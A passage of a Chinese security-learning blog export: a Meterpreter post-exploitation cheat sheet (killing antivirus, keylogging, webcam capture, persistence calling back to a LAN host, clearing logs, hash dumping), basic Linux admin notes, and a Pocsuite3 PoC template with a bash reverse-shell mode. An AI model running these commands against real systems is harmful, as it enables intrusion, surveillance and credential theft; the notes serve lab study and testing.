 killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run                          #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389            #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line"></span><br><span class="line">clearev                       							#清除日志</span><br><span class="line"></span><br><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br><span class="line"></span><br></pre>

]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>MS17-010</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux随记</title>
    <url>/article/Linux%E9%9A%8F%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="网卡配置"><a href="#网卡配置" class="headerlink" title="网卡配置"></a>网卡配置</h1><h2 id="配置静态IP："><a href="#配置静态IP：" class="headerlink" title="配置静态IP："></a>配置静态IP：</h2><pre class="highlight"><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eth0 或ifcfg-ens33</span><br><span class="line"></span><br><span class="line">ONBOOT=yes</span><br><span class="line"></span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line"></span><br><span class="line">IPADDR=&quot;192.168.x.x&quot;</span><br><span class="line"></span><br><span class="line">NETMASK=&quot;255.255.255.0&quot;</span><br><span class="line"></span><br><span class="line">GATEWAY=&quot;192.168.x.1&quot;</span><br></pre>

<pre class="highlight"><span class="line">ifdown eth0   禁用网卡</span><br><span class="line"></span><br><span class="line">ifup eth0      启用网卡</span><br></pre>

<h2 id="配置DNS："><a href="#配置DNS：" class="headerlink" title="配置DNS："></a>配置DNS：</h2><pre class="highlight"><span class="line">vim /etc/resolv.conf</span><br><span class="line"></span><br><span class="line">nameserver 8.8.8.8</span><br></pre>

<h2 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h2><p>arp -a 192.168.x.x  查看ip是否被使用，用来选择静态ip</p>
<p>常用DNS：</p>
<p>国内：114.114.114.114、223.5.5.5、119.29.29.29等</p>
<p>国外：1.1.1.1、8.8.8.8等</p>
<h1 id="重要目录及文件"><a href="#重要目录及文件" class="headerlink" title="重要目录及文件"></a>重要目录及文件</h1><table>
<thead>
<tr>
<th>目录</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>/etc</td>
<td>存放所有管理系统所需要的配置文件和子目录</td>
</tr>
<tr>
<td></td>
<td>/etc/passwd                                  #存放操作系统用户信息<br>/etc/shadow                                 #存放操作系统账户密码<br>/etc/group                                    #存储当前系统中所有用户组信息<br>/etc/gshadow                               #存储用户组密码的一类信息<br>/etc/nginx/nginx.conf                 # Nginx配置文件<br>/etc/httpd/conf/httpd.conf        # Apache配置文件路径</td>
</tr>
<tr>
<td>/usr</td>
<td>Linux系统资源目录，类似Windows下的program files目录</td>
</tr>
<tr>
<td></td>
<td>/usr/local/nginx/html        # Nginx默认网站路径</td>
</tr>
<tr>
<td>/var</td>
<td>系统运行时需要改变的数据&lt;br /</td>
</tr>
<tr>
<td></td>
<td>/var/log                  #日志存放目录<br>/var/spool/cron    #计划任务目录，定时执行<br>/var/lib/mysql       # mysql数据路径<br>/var/www/html     # Apache默认网站路径</td>
</tr>
</tbody></table>
<h1 id="常用解压压缩"><a href="#常用解压压缩" class="headerlink" title="常用解压压缩"></a>常用解压压缩</h1><pre class="highlight"><span class="line">tar -zxvf file  -C ./dir			  	#解压.tar.gz文件到指定文件夹</span><br><span class="line"></span><br><span class="line">tar -zcvf ./file  file1 file2			#打包压缩成.tar.gz文件，注意，压缩成的文件需要在-f参数后面</span><br><span class="line"></span><br><span class="line">unzip file								#解压zip文件</span><br><span class="line"></span><br><span class="line">zip file								#压缩zip文件</span><br><span class="line"></span><br></pre>

<pre class="highlight"><span class="line">7za x file.7z -r -o./					#解压</span><br><span class="line">7za a -t7z file.7z /opt/fileName/*		#压缩</span><br></pre>

<p>注：压缩中，-t指定压缩类型，可忽略（默认7z）</p>
<p>下载使用</p>
<pre class="highlight"><span class="line">yum install p7zip -y</span><br></pre>



<h1 id="VI使用"><a href="#VI使用" class="headerlink" title="VI使用"></a>VI使用</h1><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>i、I</td>
<td>i光标处输入，I所在行第一个非空格符处输入</td>
</tr>
<tr>
<td>a、A</td>
<td>a光标下一个字符处输入，A行末处输入</td>
</tr>
<tr>
<td>o、O</td>
<td>o光标下一新行输入，O光标上一新行输入</td>
</tr>
<tr>
<td>ESC</td>
<td>命令模式</td>
</tr>
<tr>
<td>ctrl+b</td>
<td>上翻</td>
</tr>
<tr>
<td>ctrl+f</td>
<td>下翻</td>
</tr>
<tr>
<td>0</td>
<td>移动到行首</td>
</tr>
<tr>
<td>$</td>
<td>移动到行尾</td>
</tr>
<tr>
<td>gg</td>
<td>移动到文档首</td>
</tr>
<tr>
<td>G</td>
<td>移动到文档尾</td>
</tr>
<tr>
<td>:%s/word1/word2/g</td>
<td>全局替换word1为word2</td>
</tr>
<tr>
<td>/word</td>
<td>向光标之下寻找word字符串</td>
</tr>
<tr>
<td>?word</td>
<td>向光标之上寻找word字符串</td>
</tr>
<tr>
<td>x、X</td>
<td>剪切</td>
</tr>
<tr>
<td>dd</td>
<td>删除整行</td>
</tr>
<tr>
<td>ndd</td>
<td>删除n行</td>
</tr>
<tr>
<td>yy</td>
<td>复制整行</td>
</tr>
<tr>
<td>nyy</td>
<td>复制n行</td>
</tr>
<tr>
<td>p、P</td>
<td>p向下粘贴，P向上粘贴</td>
</tr>
<tr>
<td>u</td>
<td>撤销，直至还原</td>
</tr>
<tr>
<td>ctrl+r</td>
<td>撤销，仅限一步</td>
</tr>
<tr>
<td>.</td>
<td>重复上一个动作</td>
</tr>
<tr>
<td>:q</td>
<td>不保存退出</td>
</tr>
<tr>
<td>:w</td>
<td>保存退出</td>
</tr>
<tr>
<td>:!</td>
<td>强制执行</td>
</tr>
<tr>
<td>:! command</td>
<td>暂时离开vi执行command</td>
</tr>
<tr>
<td>:set nu</td>
<td>显示行号</td>
</tr>
<tr>
<td>:set nonu</td>
<td>取消显示行号</td>
</tr>
</tbody></table>
<h1 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h1><pre class="highlight"><span class="line">find / -name &quot;file&quot;  在根目录下查看文件名为file的文件</span><br><span class="line">find / -perm &quot;root&quot;  在根目录下查找root权限文件</span><br><span class="line">find / -user &quot;root&quot;  在根目录下查找root用户文件</span><br></pre>



<h1 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h1><h2 id="curl安装"><a href="#curl安装" class="headerlink" title="curl安装"></a>curl安装</h2><p>（需要有下载路径，本机对服务器的下载）</p>
<p>curl _ip/_file -o filename  -o可替换为&gt;</p>
<h2 id="scp上传"><a href="#scp上传" class="headerlink" title="scp上传"></a>scp上传</h2><p>（需要有源文件，本机对服务器的上传）</p>
<p>scp：ssh+sftp，占用ssh端口及账号及部分功能，使用sftp协议，进行文件上传</p>
<p>scp filename root@ip:/_path</p>
<h2 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a>yum安装</h2><p>（需要源网站里面有对应的软件）</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>yum search</td>
<td>查找</td>
</tr>
<tr>
<td>yum install</td>
<td>安装</td>
</tr>
<tr>
<td>yum remove</td>
<td>移除</td>
</tr>
<tr>
<td>yum update</td>
<td>升级，可指定升级，也可全部升级</td>
</tr>
</tbody></table>
<p>注：yum源文件：/etc/yum.repos.d</p>
<h2 id="wget安装"><a href="#wget安装" class="headerlink" title="wget安装"></a>wget安装</h2><p>（同curl，但是更简单，速度更快）</p>
<p>wget _path/_file</p>
<h2 id="源码安装步骤"><a href="#源码安装步骤" class="headerlink" title="源码安装步骤"></a>源码安装步骤</h2><table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>1、tar 解包</td>
<td>解压缩源码包到指定目录</td>
</tr>
<tr>
<td>2、./configure</td>
<td>配置生成makefile文件，可手动配置参数（如安装路径）</td>
</tr>
<tr>
<td>3、make编译</td>
<td>生成可执行的二进制文件</td>
</tr>
<tr>
<td>4、make install安装</td>
<td>复制二进制文件到系统，配置应用环境（如应用安装路径配置文件）</td>
</tr>
</tbody></table>
<p>注：configure配置文档（官方文档）</p>
<p><a href="http://nginx.org/en/docs/configure/html">http://nginx.org/en/docs/configure/html</a>  </p>
<h1 id="firewall防火墙配置"><a href="#firewall防火墙配置" class="headerlink" title="firewall防火墙配置"></a>firewall防火墙配置</h1><table>
<thead>
<tr>
<th align="left">命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">firewall-cmd  –state</td>
<td>查看防火墙状态</td>
</tr>
<tr>
<td align="left">firewall-cmd  –get-active-zones</td>
<td>查看正在使用的区域及网卡名称</td>
</tr>
<tr>
<td align="left">firewall-cmd  –list-all-zones</td>
<td>显示当前预期网卡配置参数、资源、端口及服务等信息</td>
</tr>
<tr>
<td align="left">firewall-cmd  –zone=public –add-port=80/tcp –permanent</td>
<td>允许80端口tcp流量通过，永久生效</td>
</tr>
<tr>
<td align="left">firewall-cmd  –zone=public –add-service=http –permanent</td>
<td>同上，不同的配置方式</td>
</tr>
<tr>
<td align="left">firewall-cmd  –zone=public –remove-port=23/udp –permanent</td>
<td>禁止23端口udp流量通过，永久生效</td>
</tr>
<tr>
<td align="left">firewall-zone  –zone=public –remove-service=dns –permanent</td>
<td>同上，不同配置方式</td>
</tr>
</tbody></table>
<p>常用端口服务：</p>
<table>
<thead>
<tr>
<th>服务</th>
<th>端口</th>
</tr>
</thead>
<tbody><tr>
<td>http</td>
<td>80/tcp</td>
</tr>
<tr>
<td>https</td>
<td>443/tcp</td>
</tr>
<tr>
<td>dns</td>
<td>23/udp</td>
</tr>
<tr>
<td>mysql</td>
<td>3306/tcp</td>
</tr>
<tr>
<td>ssh</td>
<td>22/tcp</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>随记</tag>
      </tags>
  </entry>
  <entry>
    <title>Pocsuite3使用</title>
    <url>/article/Pocsuite3%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="命名规则"><a href="#命名规则" class="headerlink" title="命名规则"></a>命名规则</h1><pre class="highlight"><span class="line">漏洞应用名_版本号_漏洞类型名称 </span><br></pre>

<p>（所有字母均为小写,所有的符号改成_）</p>
<p>例：</p>
<pre class="highlight"><span class="line">88979_cmseasy_5_5_sql_injection.py</span><br></pre>



<h1 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h1><pre class="highlight"><span class="line">#导入所写PoC所需要类/文件，尽量不要使用第三方模块。</span><br><span class="line">#迫不得已使用第三方模块有其依赖规则，后面给出。</span><br><span class="line">from pocsuite3.api import Output,POCBase,register_poc,requests</span><br><span class="line"></span><br><span class="line">#PoC实现类，继承POCBase</span><br><span class="line">class DemoPoc(POCBase):</span><br><span class="line">	#PoC信息字段，需要完整填写全部下列信息</span><br><span class="line">	vulID = &#x27;1000&#x27;  					# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span><br><span class="line">    version = &#x27;1&#x27; 						# 默认为1</span><br><span class="line">    author = &#x27;chen&#x27; 					# PoC作者的大名</span><br><span class="line">    vulDate = &#x27;2014-10-16&#x27; 				# 漏洞公开的时间,不知道就写今天</span><br><span class="line">    createDate = &#x27;2014-10-16&#x27;			# 编写PoC的日期</span><br><span class="line">    updateDate = &#x27;2014-10-16&#x27;			# PoC更新的时间,默认和编写时间一样</span><br><span class="line">    references = [&#x27;https://www.sektioneins.de/en/blog/14-10-15-drupal-sql-injection-vulnerability.html&#x27;]</span><br><span class="line">    									# 漏洞地址来源,0day不用写</span><br><span class="line">    name = &#x27;Drupal 7.x /includes/database/database.inc SQL注入漏洞 PoC&#x27;			# PoC名称</span><br><span class="line">    appPowerLink = &#x27;https://www.drupal.org/&#x27;			# 漏洞厂商主页地址</span><br><span class="line">    appName = &#x27;Drupal&#x27;									# 漏洞应用名称</span><br><span class="line">    appVersion = &#x27;7.x&#x27;									# 漏洞影响版本</span><br><span class="line">    vulType = &#x27;SQL Injection&#x27;							# 漏洞类型,类型参考见 漏洞类型规范表</span><br><span class="line">    desc = &#x27;&#x27;&#x27;</span><br><span class="line">    	漏洞简要描述</span><br><span class="line">    &#x27;&#x27;&#x27; </span><br><span class="line">    samples = []										# 测试样列,就是用 PoC 测试成功的网站</span><br><span class="line">    install_requires = [] 	# PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span><br><span class="line">    #第三方插件需再此处注明</span><br><span class="line">   	# 整个字段的值为list，每个项为一个依赖模块</span><br><span class="line">   	# install_requires =[str_item_,str_item,…] </span><br><span class="line">   	# 如果遇到安装时模块名与调用时的不一致情况，用:分割开</span><br><span class="line">   	# 例如常见的加密算法库pycryptodome,但是调用是以from Crypto.Cipher import AES,此时就需要如下填写</span><br><span class="line">	# install_requires = [&#x27;pycryptodome:Crypto&#x27;]</span><br><span class="line">   	pocDesc = &#x27;&#x27;&#x27; </span><br><span class="line">   		poc的用法描述 </span><br><span class="line">   	&#x27;&#x27;&#x27;</span><br><span class="line">   	</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"> 	#编写验证模式</span><br><span class="line">	def _verify(self):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        # 验证代码</span><br><span class="line">        if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">     </span><br><span class="line">    #编写攻击模式</span><br><span class="line">    #若没有攻击模式，直接写return self._verify()即可</span><br><span class="line">    def _attack(self):</span><br><span class="line">    	output = Output(self)</span><br><span class="line">    	result = &#123;&#125;</span><br><span class="line">    	# 攻击代码</span><br><span class="line">    	if x:</span><br><span class="line">        	result[&#x27;VerifyInfo&#x27;]=&#123;&#125;</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;URL&#x27;] = target</span><br><span class="line">            result[&#x27;VerifyInfo&#x27;][&#x27;Postdata&#x27;] = payload</span><br><span class="line">            ...</span><br><span class="line">        return self.parse_output(result)		# 必须返回result</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    #编写shell模式</span><br><span class="line">    def _shell(self):</span><br><span class="line">    	cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())</span><br><span class="line">    	# 攻击代码 execute cmd</span><br><span class="line">    </span><br><span class="line">    #自定义输出函数，调用框架输出的实例Output</span><br><span class="line">	def parse_output(self,result):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#x27;target is not vulnerable&#x27;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line">register_poc(DemoPoc)</span><br></pre>



<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><pre class="highlight"><span class="line"># 使用test.py这个PoC去检测http://test.com这个url</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify </span><br><span class="line"></span><br><span class="line"># shell 反弹模式</span><br><span class="line">pocsuite -u http://test.com -r test.py --verify --shell </span><br><span class="line"></span><br><span class="line"># pocsuite3中自带的ecshop poc中实现了自定义命令`command`,可以从外部参数传递</span><br><span class="line">pocsuite -u http://test.com -r ecshop_rce.py --attack --command &quot;whoami&quot; </span><br><span class="line"></span><br><span class="line">#使用test.py这个PoC去检测url.txt文件里所有的url</span><br><span class="line">pocsuite -f url.txt -r test.py --verify </span><br></pre>



<h1 id="Result结果参数说明"><a href="#Result结果参数说明" class="headerlink" title="Result结果参数说明"></a>Result结果参数说明</h1><pre class="highlight"><span class="line">result：[</span><br><span class="line">    &#123;  name: &#x27;DBInfo&#x27;，        value：&#x27;数据库内容&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value：&#x27;管理员密码&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Salt&#x27;，          value: &#x27;加密盐值&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;用户ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Groupid&#x27;，       value: &#x27;用户组ID&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;ShellInfo&#x27;，     value: &#x27;Webshell信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;Webshell地址&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;Webshell内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;FileInfo&#x27;，      value: &#x27;文件信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Filename&#x27;，      value: &#x27;文件名称&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Content&#x27;，       value: &#x27;文件内容&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;XSSInfo&#x27;，       value: &#x27;跨站脚本信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Payload&#x27;，       value: &#x27;验证Payload&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;AdminInfo&#x27;，     value: &#x27;管理员信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Uid&#x27;，           value: &#x27;管理员ID&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value: &#x27;管理员用户名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;管理员密码&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;Database&#x27;，      value：&#x27;数据库信息&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Hostname&#x27;，      value: &#x27;数据库主机名&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Username&#x27;，      value：&#x27;数据库用户名&#x27; &#125;，</span><br><span class="line">        &#123;  name: &#x27;Password&#x27;，      value: &#x27;数据库密码&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;DBname&#x27;，        value: &#x27;数据库名&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;VerifyInfo&#x27;，    value: &#x27;验证信息&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Target&#x27;，        value: &#x27;验证host:port&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;URL&#x27;，           value: &#x27;验证URL&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Postdata&#x27;，      value: &#x27;验证POST数据&#x27;&#125;,</span><br><span class="line">        &#123;  name: &#x27;Path&#x27;，          value: &#x27;网站绝对路径&#x27;&#125;,</span><br><span class="line"></span><br><span class="line">    &#123;  name: &#x27;SiteAttr&#x27;，      value: &#x27;网站服务器信息&#x27;&#125;,</span><br><span class="line">    &#123;  name: &#x27;Process&#x27;，       value: &#x27;服务器进程&#x27;&#125;</span><br><span class="line"></span><br><span class="line">    ]</span><br></pre>



<h1 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h1><table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>from pocsuite3.api import logger</td>
<td>日志记录，比如logger.log(info)</td>
</tr>
<tr>
<td>from pocsuite3.api import requests</td>
<td>请求类，用法同 requests</td>
</tr>
<tr>
<td>from pocsuite3.api import Seebug</td>
<td>Seebug api 调用</td>
</tr>
<tr>
<td>from pocsuite3.api import ZoomEye</td>
<td>ZoomEye api 调用</td>
</tr>
<tr>
<td>from pocsuite3.api import CEye</td>
<td>Ceye api 调用</td>
</tr>
<tr>
<td>from pocsuite3.api import crawl</td>
<td>简单爬虫功能</td>
</tr>
<tr>
<td>from pocsuite3.api import PHTTPServer</td>
<td>Http服务功能</td>
</tr>
<tr>
<td>from pocsuite3.api import REVERSE_PAYLOAD</td>
<td>反向连接shell payload</td>
</tr>
<tr>
<td>from pocsuite3.api import get_results</td>
<td>获取结果</td>
</tr>
</tbody></table>
<h1 id="漏洞类型规范"><a href="#漏洞类型规范" class="headerlink" title="漏洞类型规范"></a>漏洞类型规范</h1><table>
<thead>
<tr>
<th>英文名称</th>
<th>中文名称</th>
<th>缩写</th>
</tr>
</thead>
<tbody><tr>
<td>Cross Site Scripting</td>
<td>跨站脚本</td>
<td>xss</td>
</tr>
<tr>
<td>Cross Site Request Forgery</td>
<td>跨站请求伪造</td>
<td>csrf</td>
</tr>
<tr>
<td>SQL Injection</td>
<td>Sql注入</td>
<td>sql-inj</td>
</tr>
<tr>
<td>LDAP Injection</td>
<td>ldap注入</td>
<td>ldap-inj</td>
</tr>
<tr>
<td>Mail Command Injection</td>
<td>邮件命令注入</td>
<td>smtp-inj</td>
</tr>
<tr>
<td>Null Byte Injection</td>
<td>空字节注入</td>
<td>null-byte-inj</td>
</tr>
<tr>
<td>CRLF Injection</td>
<td>CRLF注入</td>
<td>crlf-inj</td>
</tr>
<tr>
<td>SSI Injection</td>
<td>Ssi注入</td>
<td>ssi-inj</td>
</tr>
<tr>
<td>XPath Injection</td>
<td>Xpath注入</td>
<td>xpath-inj</td>
</tr>
<tr>
<td>XML Injection</td>
<td>Xml注入</td>
<td>xml-inj</td>
</tr>
<tr>
<td>XQuery Injection</td>
<td>Xquery 注入</td>
<td>xquery-inj</td>
</tr>
<tr>
<td>Command Execution</td>
<td>命令执行</td>
<td>cmd-exec</td>
</tr>
<tr>
<td>Code Execution</td>
<td>代码执行</td>
<td>code-exec</td>
</tr>
<tr>
<td>Remote File Inclusion</td>
<td>远程文件包含</td>
<td>rfi</td>
</tr>
<tr>
<td>Local File Inclusion</td>
<td>本地文件包含</td>
<td>lfi</td>
</tr>
<tr>
<td>Abuse of Functionality</td>
<td>功能函数滥用</td>
<td>func-abuse</td>
</tr>
<tr>
<td>Brute Force</td>
<td>暴力破解</td>
<td>brute-force</td>
</tr>
<tr>
<td>Buffer Overflow</td>
<td>缓冲区溢出</td>
<td>buffer-overflow</td>
</tr>
<tr>
<td>Content Spoofing</td>
<td>内容欺骗</td>
<td>spoofing</td>
</tr>
<tr>
<td>Credential Prediction</td>
<td>证书预测</td>
<td>credential-prediction</td>
</tr>
<tr>
<td>Session Prediction</td>
<td>会话预测</td>
<td>session-prediction</td>
</tr>
<tr>
<td>Denial of Service</td>
<td>拒绝服务</td>
<td>dos</td>
</tr>
<tr>
<td>Fingerprinting</td>
<td>指纹识别</td>
<td>finger</td>
</tr>
<tr>
<td>Format String</td>
<td>格式化字符串</td>
<td>format-string</td>
</tr>
<tr>
<td>HTTP Response Smuggling</td>
<td>http响应伪造</td>
<td>http-response-smuggling</td>
</tr>
<tr>
<td>HTTP Response Splitting</td>
<td>http响应拆分</td>
<td>http-response-splitting</td>
</tr>
<tr>
<td>HTTP Request Splitting</td>
<td>http请求拆分</td>
<td>http-request-splitting</td>
</tr>
<tr>
<td>HTTP Request Smuggling</td>
<td>http请求伪造</td>
<td>http-request-smuggling</td>
</tr>
<tr>
<td>HTTP Parameter Pollution</td>
<td>http参数污染</td>
<td>hpp</td>
</tr>
<tr>
<td>Integer Overflows</td>
<td>整数溢出</td>
<td>int-overflow</td>
</tr>
<tr>
<td>Predictable Resource Location</td>
<td>可预测资源定位</td>
<td>res-location</td>
</tr>
<tr>
<td>Session Fixation</td>
<td>会话固定</td>
<td>session-fixation</td>
</tr>
<tr>
<td>URL Redirector Abuse</td>
<td>url重定向</td>
<td>redirect</td>
</tr>
<tr>
<td>Privilege Escalation</td>
<td>权限提升</td>
<td>privilege-escalation</td>
</tr>
<tr>
<td>Resolve Error</td>
<td>解析错误</td>
<td>resolve-error</td>
</tr>
<tr>
<td>Arbitrary File Creation</td>
<td>任意文件创建</td>
<td>file-creation</td>
</tr>
<tr>
<td>Arbitrary File Download</td>
<td>任意文件下载</td>
<td>file-download</td>
</tr>
<tr>
<td>Arbitrary File Deletion</td>
<td>任意文件删除</td>
<td>file-deletion</td>
</tr>
<tr>
<td>Backup File Found</td>
<td>备份文件发现</td>
<td>bak-file-found</td>
</tr>
<tr>
<td>Database Found</td>
<td>数据库发现</td>
<td>db-found</td>
</tr>
<tr>
<td>Directory Listing</td>
<td>目录遍历</td>
<td>dir-listing</td>
</tr>
<tr>
<td>Directory Traversal</td>
<td>目录穿越</td>
<td>dir-traversal</td>
</tr>
<tr>
<td>File Upload</td>
<td>文件上传</td>
<td>file-upload</td>
</tr>
<tr>
<td>Login Bypass</td>
<td>登录绕过</td>
<td>login-bypass</td>
</tr>
<tr>
<td>Weak Password</td>
<td>弱密码</td>
<td>weak-pass</td>
</tr>
<tr>
<td>Remote Password Change</td>
<td>远程密码修改</td>
<td>remote-pass-change</td>
</tr>
<tr>
<td>Code Disclosure</td>
<td>代码泄漏</td>
<td>code-disclosure</td>
</tr>
<tr>
<td>Path Disclosure</td>
<td>路径泄漏</td>
<td>path-disclosure</td>
</tr>
<tr>
<td>Information Disclosure</td>
<td>信息泄漏</td>
<td>info-disclosure</td>
</tr>
<tr>
<td>Security Mode Bypass</td>
<td>安全模式绕过</td>
<td>sec-bypass</td>
</tr>
<tr>
<td>Malware</td>
<td>挂马</td>
<td>mal</td>
</tr>
<tr>
<td>Black Link</td>
<td>暗链</td>
<td>black-link</td>
</tr>
<tr>
<td>Backdoor</td>
<td>后门</td>
<td>backdoor</td>
</tr>
<tr>
<td>Unauthorized access</td>
<td>未授权访问</td>
<td>Unauthorized access</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>pocsuite3模块</tag>
      </tags>
  </entry>
  <entry>
    <title>Pocsuite3重写redis脚本</title>
    <url>/article/Pocsuite3%E9%87%8D%E5%86%99redis%E8%84%9A%E6%9C%AC/</url>
    <content><![CDATA[<h1 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h1><p>本脚本只做学习使用，请勿用作非法用途！</p>
<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>结合pocsuite3所学，重写redis漏洞复现。内含PoC模块、attack模块和shell模块。密码爆破功能请继续使用旧版本：<code>redis.py</code></p>
<p>其中，shell模式下会报错，但是不影响命令写入和反弹shell（pocsuite模块监听可以，执行有些问题，可以重写监听端口–shell模块默认监听6666端口，手动开启监听）</p>
<pre class="highlight"><span class="line">[ERROR] thread MainThread: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\core\threads.py&quot;, line 47, in run_threads</span><br><span class="line">    thread_function(*args)</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\controller\controller.py&quot;, line 148, in task_run</span><br><span class="line">    result = poc_module.execute(target, headers=conf.http_headers, mode=conf.mode, verbose=False)</span><br><span class="line">  File &quot;c:\python\python39\lib\site-packages\pocsuite3\lib\core\poc.py&quot;, line 229, in execute</span><br><span class="line">    output.params = self.params</span><br><span class="line">AttributeError: &#x27;NoneType&#x27; object has no attribute &#x27;params&#x27;</span><br></pre>

<p>搜了一下，应该是某个值为空，然后空值被调用了，导致报错。但是我的shell里面没写空值，看报错，也都是系统函数报错的，盲猜可能是不会使用pocsuite3的shell模块导致的。有了解的大佬请留言指正，感谢！</p>
<p>下载地址：</p>
